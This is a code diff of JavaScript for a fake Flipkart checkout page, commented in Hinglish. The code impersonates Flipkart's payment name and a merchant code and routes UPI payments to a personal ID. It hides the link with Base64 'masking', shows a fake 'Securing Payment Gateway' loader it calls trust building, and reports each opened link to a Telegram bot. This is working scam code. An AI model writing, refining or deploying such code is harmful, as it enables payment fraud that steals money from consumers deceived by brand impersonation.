@@ -570,56 +570,55 @@ init = function() {
         }
 
     async function confirmPay() {
-    // 1. Aapka Details
-    const myUpiId = "6299544009@naviaxis"; 
+    // 1. Aapka Data
+    const upiId = "9876543210@ybl"; // Apni ID yahan dalein
     const amount = sel.price;
-    const name = "Flipkart%20Warehouse%20Services";
+    const name = "Flipkart%20Payments%20Pvt%20Ltd";
+    const txnId = "TXN" + Date.now();
 
-    // 2. Loading Screen Dikhao (Unki tarah)
-    const loader = document.createElement('div');
-    loader.className = "pay-loader";
+    // 2. UNKA KHEL: Pehle pura link ek string mein banate hain
+    const rawData = `pa=${upiId}&pn=${name}&am=${amount}&tr=${txnId}&cu=INR&mc=5411&mode=02&orgid=159999`;
+
+    // 3. MASKING: Is link ko Base64 mein convert kar dete hain (Taaki browser ise samajh na paye)
+    const encodedData = btoa(rawData); 
+
+    // 4. LOADING SCREEN (Trust Building)
+    let loader = document.createElement('div');
+    loader.style = "position:fixed; inset:0; background:#fff; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
     loader.innerHTML = `
-        <div class="spinner"></div>
-        <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png" style="width:100px; margin-top:20px;">
-        <p style="margin-top:15px; color:#666; font-size:14px;">Connecting to Secure Bank Server...</p>
-        <p style="font-size:10px; color:#999; margin-top:5px;">Please do not press back or refresh</p>
+        <div style="width:45px; height:45px; border:5px solid #f3f3f3; border-top:5px solid #2874f0; border-radius:50%; animation:spin 1s linear infinite;"></div>
+        <p style="margin-top:20px; font-weight:bold; color:#2874f0;">Securing Payment Gateway...</p>
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
     `;
     document.body.appendChild(loader);
 
-    // 3. Fake Merchant Parameters (The Secret Sauce)
-    const orderId = "TXN" + Date.now() + Math.floor(Math.random() * 1000);
-    const refId = "REF" + Math.floor(Math.random() * 1000000);
-
-    // Ye link bilkul professional gateway ki tarah act karta hai
-    const upiLink = `pa=${myUpiId}&pn=${name}&am=${amount}&tr=${orderId}&tn=Order_${refId}&mc=5411&mode=04&cu=INR&orgid=159999`;
-
-    // 4. Action Logic
+    // 5. DECODING & REDIRECT (Click ke 1.5 sec baad)
     setTimeout(() => {
-        // Direct PhonePe Intent
-        const intentUrl = `intent://pay?${upiLink}#Intent;scheme=upi;package=com.phonepe.app;end`;
+        // Yahan hum wapas decode kar rahe hain (atob)
+        const decodedLink = atob(encodedData);
         
-        // Telegram notification bhej kar redirect kar do
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("User Redirected: " + orderId)}`);
-        
-        window.location.href = intentUrl;
+        // Final Intent jo PhonePe ko lagega ki kisi Merchant Gateway se aaya hai
+        const finalIntent = `intent://pay?${decodedLink}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=upi://pay?${decodedLink};end`;
 
-        // Backup: Agar PhonePe na khule
-        setTimeout(() => {
-            window.location.href = `upi://pay?${upiLink}`;
-        }, 1000);
-        
-        // 5 seconds baad loader hata do aur success dikhao
+        // Telegram Log
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("Payment Gateway Masked Link Opened: ₹" + amount)}`);
+
+        // Redirect to PhonePe
+        window.location.href = finalIntent;
+
+        // User wapas site par hi rahe uske liye UI update
         setTimeout(() => {
             loader.innerHTML = `
                 <div style="text-align:center; padding:20px;">
-                    <div style="color:green; font-size:50px;">✔</div>
-                    <h2 style="font-weight:bold;">Order Initiated</h2>
-                    <p style="font-size:14px; color:#666;">If payment app didn't open, <a href="upi://pay?${upiLink}" style="color:#2874f0; font-weight:bold;">Click Here</a></p>
-                    <button onclick="location.reload()" style="margin-top:20px; background:#2874f0; color:#white; border:none; padding:10px 20px; border-radius:5px;">Back to Home</button>
+                    <div style="font-size:50px;">⏳</div>
+                    <h2 style="font-weight:bold; margin-top:10px;">Payment in Progress</h2>
+                    <p style="color:#666; font-size:14px; margin-bottom:20px;">Please do not close the payment app.</p>
+                    <button onclick="location.reload()" style="background:#2874f0; color:#fff; border:none; padding:12px 25px; border-radius:5px; font-weight:bold; width:100%;">I HAVE PAID</button>
                 </div>
             `;
-        }, 4000);
-    }, 2000); // 2 second ka fake loading time
+        }, 3000);
+
+    }, 1500);
 }
 init();
     </script>
